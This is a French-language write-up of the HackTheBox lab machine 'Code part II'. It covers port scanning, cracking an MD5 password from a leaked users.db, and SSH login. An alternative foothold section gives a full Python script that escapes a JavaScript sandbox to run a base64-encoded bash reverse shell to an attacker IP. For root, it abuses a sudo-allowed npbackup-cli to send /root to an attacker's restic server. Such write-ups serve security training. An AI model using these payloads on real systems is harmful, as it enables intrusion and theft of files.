---
tags:
  - HTB
  - machine
date: 2025-09-17T10:37
tasks:
  - mise en page
parent: "[[HTB MOC Linux]]"
category: writeups
difficulty: easy
os: linux
title: Code part II Writeup
description: This is a writeup for the HTB box "code part II"
---

# Enumeration

On fait une petite énumération mais on ne trouve que ça au départ:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Gunicorn 20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On regarde un peu sur le port 8000, on tombe sur un site web qui nous propose d'écrire du code, sous ECMA 5.1, de l'exécuter et de le sauvegarder. J'ai donc créé un compte et essayé de chercher un exploit.

En parallèle, l'énumération gobuster ne donne rien du tout, on ne trouve que les pages de base, celles que l'on peut trouver en cherchant manuellement sur le site.

En plus de ça, on trouve un fichier zip sur le site, nous donnant le code du site, ce qui ne nous aide pas à grand chose pour le moment excepté pour savoir où trouver les fichiers intéressants.

Comme on a de quoi exécuter du code, j'ai cherché pendant un looooong moment comment exécuter un RCE en javascript. J'ai donc trouvé un payload sur [revshells.com](revshells.com), qui était en fait un payload en PHP ou Java (je ne sais plus), un programme qui devait en générer un mais qui en fait attendait des connexions distantes comme un listener, et aucune doc. Après un peu de recherches et de temps perdu je me suis rappelé que le JS était exécuté côté client. Il doit y avoir quelques instances de code où le JS est exécuté côté machine (Node.js par exemple), cela vaudrait la peine de rechercher plus tard #TODO .

On est donc de retour aux scans, comme on ne trouve rien. On repart avec un scan des ports UDP, mais cela ne donne rien. Comme le site est sur le port 8000 et pas 80, cela vaut la peine de chercher un peu plus. On lance donc une commande de plus pour fouiller extensivement les ports TCP
```bash
sudo nmap -sV -sS $box -o nmap.scan
```
et on obtient une réponse intéressante:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Gunicorn 20.0.4
9009/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.10)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ce n'est pas le port 80 mais on avance.

![[Pasted image 20251105230145.png]]

# Foothold

On se connecte sur le port 9009 et on trouve un unique fichier `users.db`. On le télécharge et l'ouvre avec `sqlite3` et BINGO, on a des identifiants:
```
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
```

[Crackstation](crackstation.net) identifie le premier comme un hash md5, correspondant au mot de passe `sweetangelbabylove`. 

```
marco:sweetangelbabylove
```

On essaye de le cracker avec hashcat:
```bash
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt  
```
 
Malheureusement cela ne donne rien. On y reviendra si jamais on en a vraiment besoin.

On tente de se connecter en ssh (qu'on avait vu dans les scans, même si il y a toujours ssh) avec les identifiants de marco et BINGO, on a un accès à la machine. Et juste comme ça, on a notre flag user.

![[Pasted image 20251105230225.png]]

# Alternative foothold

Il existe aussi sur cette box une rce, que l'on peut utiliser avec le code suivant.
```
import requests  
import json  
  
url = 'http://codetwo.htb:8000/run_code'  
  
js_code = """  
let cmd = "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTYuNTYvNDQ0NCAwPiYxKSAm|base64 -d|bash";  
let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__;  
let obj = a(a(a,"__class__"), "__base__");  
function findpopen(o) {  
    let result;    for(let i in o.__subclasses__()) {        let item = o.__subclasses__()[i];        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {            return item;        }        if(item.__name__ != "type" && (result = findpopen(item))) {            return result;        }    }}  
let result = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();  
console.log(result);  
result;  
"""  
  
payload = {"code": js_code}  
  
headers = {"Content-Type": "application/json"}  
  
r = requests.post(url, data=json.dumps(payload), headers=headers)  
print(r.text)
```

# LOL / Lateral movement

Aucun mouvement latéral à faire, on se concentre directement sur la privilege escalation, merci marco.

# Privilege Escalation
#npbackup

On commence une petite énumération avec
```bash
ls
```

On trouve un fichier `npbackup.conf`

On n'a pas accès au dossier backups en revanche, il appartient à root.

On continue avec
```bash
sudo -l
```

Et on trouve 
```
(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

On cat le contenu de ce fichier pour comprendre ce qu'il fait:
```
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import re
import sys
from npbackup.__main__ import main
if __name__ == '__main__':
    # Block restricted flag
    if '--external-backend-binary' in sys.argv:
        print("Error: '--external-backend-binary' flag is restricted for use.")
        sys.exit(1)

    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

On teste un peu la commande avec sudo et on voit comment la sauvegarde est faite. La commande à utiliser est
```bash
sudo /usr/local/bin/npbackup-cli -c npbackup.conf -b
```

Donc on copie la configuration du fichier `npbackup.conf`
```
cp npbackup.conf testbackup.conf
```

Puis on modifie la config de sorte à ce qu'elle copie `/root` et non pas `/home/app/app`. Ensuite, étant donné qu'on a l'uri et le mot de passe, on va essayer d'accéder au repo. On lit sur la [doc](https://pypi.org/project/npbackup/3.0.0rc9/) que les repos npbackup peuvent être gérés par restic.

On lit dans la doc de npbackup que les informations importantes comme le uri de repo et le mote de passe sont encryptés, il nous faut donc les décrypter avant d'y accéder.


On lance notre serveur restic
```
./rest-server --path /tmp/restictemp --listen :8888 --no-auth
```

Ensuite on copie le fichier `npbackup.conf` dans `test.conf` et on met notre repo `rest:http://<yourip>:8888/cpt` et notre mot de passe `pass` dans la config, on lance la backup
```
sudo /usr/local/bin/npbackup-cli -c test.conf -b
```

On a donc notre repo restic qui tourne sur l'adresse
```
rest:http://10.10.14.239:8888/cpt
```

On va donc exécuter une backup sur le dossier /root. Pour cela, on se fait une config `test.conf` dans laquelle on met une version modifiée de `npbackup.conf`:
```
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: 
      rest:http://10.10.14.239:8888/cpt
    repo_group: default_group
    backup_opts:
      paths:
      - /root
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password: 
        pass
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: false
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
        pass
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
```

Ensuite, on fait la backup
```
sudo /usr/local/bin/npbackup-cli -c test.conf -bf
```

Puis on vérifie que la backup a bien été faite avec
```
restic -r rest:http://10.10.14.239:8888/cpt snapshots
```

Une fois que l'on a bien vu que la backup était faite, on retourne sur la machine attacker, sur laquelle on entre la commande
```
restic -r rest:http://10.10.14.239:8888/cpt snapshots
```
pour obtenir le numéro de la backup. On le copie puis on restitue la backup dans notre machine attacker avec

```
restic -r /tmp/restictemp/cpt restore <snapshot_id> --target ./restore
```

et on peut enfin lire le fichier root.txt

![[Pasted image 20251112181156.png]]